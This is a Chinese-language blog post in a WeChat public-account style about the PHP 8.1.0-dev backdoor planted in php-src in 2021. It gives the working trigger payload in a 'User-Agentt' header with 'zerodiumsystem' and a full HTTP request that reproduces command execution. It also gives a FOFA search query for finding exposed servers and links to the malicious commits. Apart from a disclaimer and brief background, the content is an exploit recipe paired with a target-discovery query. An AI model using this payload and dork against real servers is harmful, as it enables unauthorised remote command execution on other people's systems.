#  【后门】PHP 8.1.0-dev 命令执行漏洞   
原创 漏洞推送  一个不正经的黑客   2023-11-25 20:05  
  
<table><tbody style="outline: 0px;visibility: visible;"><tr style="outline: 0px;visibility: visible;"><td width="557" valign="top" height="62" style="outline: 0px;word-break: break-all;hyphens: auto;visibility: visible;"><section style="margin-bottom: 15px;outline: 0px;visibility: visible;text-indent: 0em;"><span style="outline: 0px;font-size: 14px;visibility: visible;font-family: Optima-Regular, PingFangTC-light;color: rgb(255, 76, 65);"><strong style="outline: 0px;visibility: visible;">免责声明</strong></span><span style="outline: 0px;font-size: 14px;visibility: visible;"><span style="outline: 0px;color: rgb(217, 33, 66);visibility: visible;"><strong style="outline: 0px;visibility: visible;">：</strong></span></span><span style="outline: 0px;visibility: visible;font-size: 14px;letter-spacing: 0.578px;">本文所涉及的技术和方法仅供合法合规的目的参考和学习使用。严禁利用本文内容从事任何违法或未经授权的活动。如因个人非法使用所造成的任何不良后果，作者及本公众号概不负责</span></section></td></tr></tbody></table>  
今天，继续讲一个鲜为人知但有价值的漏洞。  
  
01  
  
漏洞概述  
  
  
01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I90uibRougiaAPoicCicqQUMe5bOZTcjRqaPWmECPpkGcj4Uz7IvHlLF60qFE9DSJlJTmIx90HqYrwvmk5Jtwgz0icg/640?wx_fmt=png "")  
  
HTTP Header User-Agentt 字段存在命令执行后门  
  
payload:   
  
  
```
User-Agentt: zerodiumsystem('id');
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8I5HGyuMrINXqLqcxWkX51mYV0MKss4sVKyiaEELcydvYx7dmn7Mv6XI2mY92xUs2ib9QuVr0icSX5JNayFqde7Rw/640?wx_fmt=png "")  
  
  
02  
  
FOFA Dork  
  
  
02  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I90uibRougiaAPoicCicqQUMe5bOZTcjRqaPWmECPpkGcj4Uz7IvHlLF60qFE9DSJlJTmIx90HqYrwvmk5Jtwgz0icg/640?wx_fmt=png "")  
  
  
FOFA Dork: "PHP/8.1.0-dev"  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMp2Uic5KHDfYsT08V6kjonGanf7icURIozrbNMiadicgGF5dsSfJicSA5dtFZdSgm2mIOF4czzEFIlCobg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8I5HGyuMrINXqLqcxWkX51mYV0MKss4sVKyiaEELcydvYx7dmn7Mv6XI2mY92xUs2ib9QuVr0icSX5JNayFqde7Rw/640?wx_fmt=png "")  
  
  
03  
  
漏洞复现  
  
  
03  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I90uibRougiaAPoicCicqQUMe5bOZTcjRqaPWmECPpkGcj4Uz7IvHlLF60qFE9DSJlJTmIx90HqYrwvmk5Jtwgz0icg/640?wx_fmt=png "")  
  
  
  
```
GET / HTTP/1.1
User-Agentt: zerodiumsystem('echo 666pHp');
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
```  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMp2Uic5KHDfYsT08V6kjonGa1XhK1XWyhj3gsdZnhuLwc7l0alSqLyXa3BIHYeiav1qIr6JMaZ5H8Og/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8I5HGyuMrINXqLqcxWkX51mYV0MKss4sVKyiaEELcydvYx7dmn7Mv6XI2mY92xUs2ib9QuVr0icSX5JNayFqde7Rw/640?wx_fmt=png "")  
  
  
04  
  
漏洞资料  
  
  
04  
  
![](https://mmbiz.qpic.cn/mmbiz_png/I90uibRougiaAPoicCicqQUMe5bOZTcjRqaPWmECPpkGcj4Uz7IvHlLF60qFE9DSJlJTmIx90HqYrwvmk5Jtwgz0icg/640?wx_fmt=png "")  
  
  
  
PHP 8.1.0-dev版本于2021年3月28日发布时曾被发现存在后门问题。在php-src存储库中提交了两个恶意的代码更改，但随后被及时发现并成功清除。这一事件突显了对于软件安全的持续关注和及时响应的重要性。对于软件安全问题，我们建议及时关注官方通告，确保及时应用安全补丁，以维护系统和应用的稳健性  
  
  
两个恶意提交Commit记录如下:  
  
  
https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d  
  
  
https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/8I5HGyuMrINXqLqcxWkX51mYV0MKss4sVKyiaEELcydvYx7dmn7Mv6XI2mY92xUs2ib9QuVr0icSX5JNayFqde7Rw/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dV2MexLmyjSmL9rgyuQwn3gewQ4XFZkPdQckzFmCzqVEtfOficwMWicd12vOVqzhibkUupaIlmcgiasTlXS7czf5Bg/640?wx_fmt=png "")  
  
往期推荐  
  
[不要总想搞小新闻，这个漏洞千万不要看！](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247500215&idx=1&sn=5954acb836e7278bc55fc8d619fd1360&chksm=c0ce3acef7b9b3d87aa133d3c3c09a03399afbc436d5f43b5e7e537afeed8163370979120a53&scene=21#wechat_redirect)  
  
  
[【简单】获取任意微信号的wxid_开头原始ID](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247499656&idx=1&sn=ce7ac3ca40c226334f292e8bd8c2b318&chksm=c0ce04f1f7b98de733e1206b331281181c6581e488c291bf25d540cc174cc15408b6dddbcbad&scene=21#wechat_redirect)  
  
  
[推荐几个高质量公众号](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247499705&idx=1&sn=d1176ab0d532dc90dc8f142c1cd14e23&chksm=c0ce04c0f7b98dd67c43727584d03eb6241b94c1731be802d21af353f30eec9573bd66a0d80c&scene=21#wechat_redirect)  
  
  
[Kinsing恶意软件利用Apache ActiveMQ漏洞进行加密货币挖矿](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247499397&idx=1&sn=42c33af2dfdc839c25ad3552eb68a8de&chksm=c0ce05fcf7b98cea72c7364dd56af82bd94fdf2c8b083edcb40fce1ca9301d8e8d9e8455e3e9&scene=21#wechat_redirect)  
  
  
[AI自动生成视频](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247499391&idx=1&sn=a28a6fcb1e1203663f00e66364413af1&chksm=c0ce0506f7b98c107c16fed3f222d3db22ec8a44e0bc8e54c3742ec8582e2c6b603671a27df8&scene=21#wechat_redirect)  
  
  
[令人深思！OpenAI  加剧互联网失业浪潮](https://mp.weixin.qq.com/s?__biz=MzkwODI1ODgzOA==&mid=2247499384&idx=1&sn=aa72c89e2302e438e18aeb671da8f4c7&chksm=c0ce0501f7b98c1768143999ee2c7cd9c9794da2b1e5d5347442807094a4581d04dd2648ff3c&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GEcMgVDQuk8WXCeJeWxoCicw6NTYvUTNR1tmyLQNeEXZoqezmS9mTY0Re8jSGs0pRzuRhzicTOb0jiboMNNnhVPVg/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GvZ8LrSx2FeBaGGenn2C0ztlEWCBVwbJIrwgKGKwVDSfOYUTdZv1giby52CluHIrYichAdeTJEpV0JYTfvXiaJZVw/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaTuCKQ0GWZica1bCbcaogd3kV37XMTAC979jicsAIWEhexJWkvtRVOr8loZdgicspRevdGLzgoaVrxg/640?wx_fmt=gif "")  
  
点击下面阅读原文  
  
